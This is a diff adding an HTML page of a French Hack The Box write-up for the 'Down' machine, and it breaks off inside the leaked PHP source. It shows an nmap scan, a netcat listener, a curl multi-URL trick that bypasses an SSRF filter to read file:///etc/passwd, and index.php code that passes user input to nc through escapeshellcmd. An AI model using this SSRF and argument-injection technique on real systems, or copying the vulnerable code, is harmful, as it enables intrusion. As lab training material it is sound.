@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Down - z3rodol</title><meta name="Description" content="This is my cool site"><meta property="og:url" content="http://localhost:1313/down/">
+  <meta property="og:site_name" content="z3rodol">
+  <meta property="og:title" content="Down">
+  <meta property="og:description" content="Down possède un site web conçu pour vérifier si un site web est en ligne. Cela présente une SSRF évidente, mais pour contourner les filtres et l’exploiter, je vais abuser de la fonctionnalité de curl qui accepte plusieurs URLs et passer une seconde URL avec le wrapper LFI file pour lire des fichiers depuis l’hôte. J’obtiens l’accès au code source de la page, et je vois qu’il existe un mode expert qui établie une connexion TCP brute avec netcat. J’utilise l’injection de paramètres à cet endroit pour obtenir un shell. De là, je fouille dans une instance pswm pour obtenir le mot de passe de l’utilisateur suivant, et celui-ci dispose des privilèges sudo pour devenir root.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-11T13:49:22+00:00">
+    <meta property="article:modified_time" content="2025-12-11T13:49:22+00:00">
+    <meta property="article:tag" content="Easy">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Pswm">
+    <meta property="article:tag" content="SSRF">
+    <meta property="og:image" content="http://localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/logo.png">
+  <meta name="twitter:title" content="Down">
+  <meta name="twitter:description" content="Down possède un site web conçu pour vérifier si un site web est en ligne. Cela présente une SSRF évidente, mais pour contourner les filtres et l’exploiter, je vais abuser de la fonctionnalité de curl qui accepte plusieurs URLs et passer une seconde URL avec le wrapper LFI file pour lire des fichiers depuis l’hôte. J’obtiens l’accès au code source de la page, et je vois qu’il existe un mode expert qui établie une connexion TCP brute avec netcat. J’utilise l’injection de paramètres à cet endroit pour obtenir un shell. De là, je fouille dans une instance pswm pour obtenir le mot de passe de l’utilisateur suivant, et celui-ci dispose des privilèges sudo pour devenir root.">
+<meta name="application-name" content="z3rodol">
+<meta name="apple-mobile-web-app-title" content="z3rodol">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/down/" /><link rel="prev" href="http://localhost:1313/certified/" /><link rel="next" href="http://localhost:1313/eureka/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Down",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/down\/"
+        },"genre": "posts","keywords": "Easy, Linux, Web, pswm, SSRF","wordcount":  1869 ,
+        "url": "http:\/\/localhost:1313\/down\/","datePublished": "2025-12-11T13:49:22+00:00","dateModified": "2025-12-11T13:49:22+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "z3rodol"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="z3rodol">z3rodol Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="z3rodol">z3rodol Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Down</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://z3rodol.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>z3rodol</a></span>&nbsp;<span class="post-category">included in <a href="/categories/machines/"><i class="far fa-folder" aria-hidden="true"></i>Machines</a>&nbsp;<a href="/categories/hackthebox/"><i class="far fa-folder" aria-hidden="true"></i>Hackthebox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2025-12-11">2025-12-11</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;1869 words&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;9 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#enumération">Enumération</a>
+          <ul>
+            <li><a href="#nmap">Nmap</a></li>
+            <li><a href="#http-80">HTTP (80)</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-en-tant-www-data">Shell en tant www-data</a>
+          <ul>
+            <li><a href="#curl">Curl</a></li>
+            <li><a href="#arbitrary-file-read">Arbitrary File Read</a></li>
+            <li><a href="#netcat">Netcat</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-en-tant-que-aleks">Shell en tant que aleks</a>
+          <ul>
+            <li><a href="#pswm">PSWM</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell-en-tant-que-root">Shell en tant que root</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Down/down.png"
+        data-srcset="/images/Down/down.png, /images/Down/down.png 1.5x, /images/Down/down.png 2x"
+        data-sizes="auto"
+        alt="/images/Down/down.png"
+        title="Down" width="573" height="313" /></p>
+<p><code>Down</code> possède un site web conçu pour vérifier si un site web est en ligne. Cela présente une <code>SSRF</code> évidente, mais pour contourner les filtres et l&rsquo;exploiter, je vais abuser de la fonctionnalité de <code>curl</code> qui accepte plusieurs URLs et passer une seconde URL avec le wrapper LFI <code>file</code> pour lire des fichiers depuis l&rsquo;hôte. J&rsquo;obtiens l&rsquo;accès au code source de la page, et je vois qu&rsquo;il existe un <code>mode expert</code> qui établie une connexion TCP brute avec <code>netcat</code>. J&rsquo;utilise l&rsquo;injection de paramètres à cet endroit pour obtenir un shell. De là, je fouille dans une instance <code>pswm</code> pour obtenir le mot de passe de l&rsquo;utilisateur suivant, et celui-ci dispose des privilèges sudo pour devenir root.</p>
+<h2 id="enumération">Enumération</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Il y a deux ports ouverts :</p>
+<ul>
+<li>22 pour le SSH</li>
+<li>80 pour le HTTP</li>
+</ul>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╭─root at exegol-htb in /workspace/Down
+</span></span><span class="line"><span class="cl">╰─○ nmap 10.129.204.56 -sV -sC -vv -oN tcp.txt
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 ( https://nmap.org ) at 2025-06-23 22:27 CEST
+</span></span><span class="line"><span class="cl">Host is up, received reset ttl 63 (0.051s latency).
+</span></span><span class="line"><span class="cl">Scanned at 2025-06-23 22:27:39 CEST for 10s
+</span></span><span class="line"><span class="cl">Not shown: 998 closed tcp ports (reset)
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON         VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey:
+</span></span><span class="line"><span class="cl">|   256 f6cc217ccadaed34fd04efe6f94cddf8 (ECDSA)
+</span></span><span class="line"><span class="cl">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9eTcP2DDxJHJ2uCdOmMRIPaoOhvMFXL33f1pZTIe0VTdeHRNYlpm2a2PumsO5t88M7QF3L3d6n1eRHTTAskGw=
+</span></span><span class="line"><span class="cl">|   256 fa061ff4bf8ce3b0c840210d5706dd11 (ED25519)
+</span></span><span class="line"><span class="cl">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJwLt0rmihlvq9pk6BmFhjTycNR54yApKIrnwI8xzYx/
+</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
+</span></span><span class="line"><span class="cl">| http-methods:
+</span></span><span class="line"><span class="cl">|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.52 (Ubuntu)
+</span></span><span class="line"><span class="cl">|_http-title: Is it down or just me?
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span></code></pre></div></div>
+<h3 id="http-80">HTTP (80)</h3>
+<p>La page principale nous présente un site permettant de tester la disponibilité d&rsquo;un site en fournissant une url. Pour cela, je lance un serveur python en local avec la commande <code>python3 -m http.server</code> et je mets l&rsquo;url. J&rsquo;ai bien une réponse du serveur.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Down/1.png"
+        data-srcset="/images/Down/1.png, /images/Down/1.png 1.5x, /images/Down/1.png 2x"
+        data-sizes="auto"
+        alt="/images/Down/1.png"
+        title="/images/Down/1.png" width="1911" height="1000" /></p>
+<p>Je mets à nouveau l&rsquo;url mais j&rsquo;intercepte avec <code>netcat</code>. Je vois dans le <code>User-Agent</code> que la commande utilisé pour vérifier la disponibilité du site en background est la commande <code>curl</code>. Donc on peut suggérer que le site effectue la commande suivante : <code>curl &lt;URL&gt;</code></p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╭─root at exegol-htb in /workspace/Down
+</span></span><span class="line"><span class="cl">╰─○ nc -lnvp 8000
+</span></span><span class="line"><span class="cl">Ncat: Version 7.93 ( https://nmap.org/ncat )
+</span></span><span class="line"><span class="cl">Ncat: Listening on :::8000
+</span></span><span class="line"><span class="cl">Ncat: Listening on 0.0.0.0:8000
+</span></span><span class="line"><span class="cl">Ncat: Connection from 10.129.204.56.
+</span></span><span class="line"><span class="cl">Ncat: Connection from 10.129.204.56:60778.
+</span></span><span class="line"><span class="cl">GET / HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 10.10.14.158:8000
+</span></span><span class="line"><span class="cl">User-Agent: curl/7.81.0
+</span></span><span class="line"><span class="cl">Accept: */*</span></span></code></pre></div></div>
+<p>Pour plus de détails voyons voir ce qui se passe dans <code>BurpSuite</code>. Donc nous envoyons juste une requête POST avec le paramètre <code>url</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Down/2.png"
+        data-srcset="/images/Down/2.png, /images/Down/2.png 1.5x, /images/Down/2.png 2x"
+        data-sizes="auto"
+        alt="/images/Down/2.png"
+        title="/images/Down/2.png" width="943" height="435" /></p>
+<h2 id="shell-en-tant-www-data">Shell en tant www-data</h2>
+<h3 id="curl">Curl</h3>
+<p>Lorsque je fournis juste l&rsquo;adresse IP, j&rsquo;ai une erreur me disant que seuls les protocoles HTTP et HTTPS sont autorisés.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Down/3.png"
+        data-srcset="/images/Down/3.png, /images/Down/3.png 1.5x, /images/Down/3.png 2x"
+        data-sizes="auto"
+        alt="/images/Down/3.png"
+        title="/images/Down/3.png" width="1864" height="800" /></p>
+<p>Tant que le paramètre <code>url</code> commence par <code>http://</code> ou <code>https://</code>, la commande s&rsquo;exécute sans problème.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Down/4.png"
+        data-srcset="/images/Down/4.png, /images/Down/4.png 1.5x, /images/Down/4.png 2x"
+        data-sizes="auto"
+        alt="/images/Down/4.png"
+        title="/images/Down/4.png" width="1866" height="804" /></p>
+<p>Je peux accéder au contenu de la machine. J&rsquo;ai donc essayé de l&rsquo;injection de commande avec différents payload, mais ça ne mène à rien.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Down/5.png"
+        data-srcset="/images/Down/5.png, /images/Down/5.png 1.5x, /images/Down/5.png 2x"
+        data-sizes="auto"
+        alt="/images/Down/5.png"
+        title="/images/Down/5.png" width="1867" height="806" /></p>
+<p>Le truc avec <code>curl</code> est qu&rsquo;il peut prendre plusieurs url en paramètre. Donc voyons si le site ne vérifie que la première URL.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Down/6.png"
+        data-srcset="/images/Down/6.png, /images/Down/6.png 1.5x, /images/Down/6.png 2x"
+        data-sizes="auto"
+        alt="/images/Down/6.png"
+        title="/images/Down/6.png" width="574" height="918" /></p>
+<h3 id="arbitrary-file-read">Arbitrary File Read</h3>
+<p>Testons donc cela, avec le wrapper <code>file:///etc/passwd</code>. Nous arrivons bien à accéder aux fichiers système.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Down/7.png"
+        data-srcset="/images/Down/7.png, /images/Down/7.png 1.5x, /images/Down/7.png 2x"
+        data-sizes="auto"
+        alt="/images/Down/7.png"
+        title="/images/Down/7.png" width="1873" height="805" /></p>
+<p>J&rsquo;accède bien au fichier <code>index.php</code> mais je remarque qu&rsquo;il contient beaucoup plus d&rsquo;infos que ce qu&rsquo;il y a lorsque j&rsquo;inspecte la page web.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Down/8.png"
+        data-srcset="/images/Down/8.png, /images/Down/8.png 1.5x, /images/Down/8.png 2x"
+        data-sizes="auto"
+        alt="/images/Down/8.png"
+        title="/images/Down/8.png" width="1874" height="802" /></p>
+<p>Le code que je récupère est url encodé. Donc je le déchiffre dans l&rsquo;onglet <code>decoder</code> de <code>BurpSuite</code> pour avoir ceci :</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-php">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;!</span><span class="nx">DOCTYPE</span> <span class="nx">html</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">html</span> <span class="nx">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">charset</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nx">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;</span><span class="nx">Is</span> <span class="nx">it</span> <span class="nx">down</span> <span class="k">or</span> <span class="nx">just</span> <span class="nx">me</span><span class="o">?&lt;/</span><span class="nx">title</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">link</span> <span class="nx">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&#34;style.css&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="nx">head</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">header</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;/logo.png&#34;</span> <span class="nx">alt</span><span class="o">=</span><span class="s2">&#34;Logo&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span><span class="nx">Is</span> <span class="nx">it</span> <span class="nx">down</span> <span class="k">or</span> <span class="nx">just</span> <span class="nx">me</span><span class="o">?&lt;/</span><span class="nx">h2</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="nx">header</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">div</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;container&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;expertmode&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;expertmode&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;tcp&#39;</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;Is the port refused, or is it just you?&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;form id=&#34;urlForm&#34; action=&#34;index.php?expertmode=tcp&#34; method=&#34;POST&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;input type=&#34;text&#34; id=&#34;url&#34; name=&#34;ip&#34; placeholder=&#34;Please enter an IP.&#34; required&gt;&lt;br&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;input type=&#34;number&#34; id=&#34;port&#34; name=&#34;port&#34; placeholder=&#34;Please enter a port number.&#34; required&gt;&lt;br&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;button type=&#34;submit&#34;&gt;Is it refused?&lt;/button&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/form&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;Is that website down, or is it just you?&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;form id=&#34;urlForm&#34; action=&#34;index.php&#34; method=&#34;POST&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;input type=&#34;url&#34; id=&#34;url&#34; name=&#34;url&#34; placeholder=&#34;Please enter a URL.&#34; required&gt;&lt;br&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;button type=&#34;submit&#34;&gt;Is it down?&lt;/button&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/form&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;expertmode&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;expertmode&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;tcp&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$ip</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$valid_ip</span> <span class="o">=</span> <span class="nx">filter_var</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_IP</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$port</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$port_int</span> <span class="o">=</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$port</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$valid_port</span> <span class="o">=</span> <span class="nx">filter_var</span><span class="p">(</span><span class="nv">$port_int</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_INT</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nv">$valid_ip</span> <span class="o">&amp;&amp;</span> <span class="nv">$valid_port</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$rc</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span> <span class="nv">$output</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ec</span> <span class="o">=</span> <span class="nx">escapeshellcmd</span><span class="p">(</span><span class="s2">&#34;/usr/bin/nc -vz </span><span class="si">$ip</span><span class="s2"> </span><span class="si">$port</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">exec</span><span class="p">(</span><span class="nv">$ec</span> <span class="o">.</span> <span class="s2">&#34; 2&gt;&amp;1&#34;</span><span class="p">,</span><span class="nv">$output</span><span class="p">,</span><span class="nv">$rc</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;div class=&#34;output&#34; id=&#34;outputSection&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nv">$rc</span> <span class="o">===</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">echo</span> <span class="s2">&#34;&lt;font size=+1&gt;It is up. It&#39;s just you! =&lt;/font&gt;&lt;br&gt;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">echo</span> <span class="s1">&#39;&lt;p id=&#34;outputDetails&#34;&gt;&lt;pre&gt;&#39;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nx">implode</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="nv">$output</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&lt;/p&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">echo</span> <span class="s2">&#34;&lt;font size=+1&gt;It is down for everyone! =&lt;/font&gt;&lt;br&gt;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">echo</span> <span class="s1">&#39;&lt;p id=&#34;outputDetails&#34;&gt;&lt;pre&gt;&#39;</span><span class="o">.</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nx">implode</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="nv">$output</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&lt;/p&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;div class=&#34;output&#34; id=&#34;outputSection&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;font color=red size=+1&gt;Please specify a correct IP and a port between 1 and 65535.&lt;/font&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
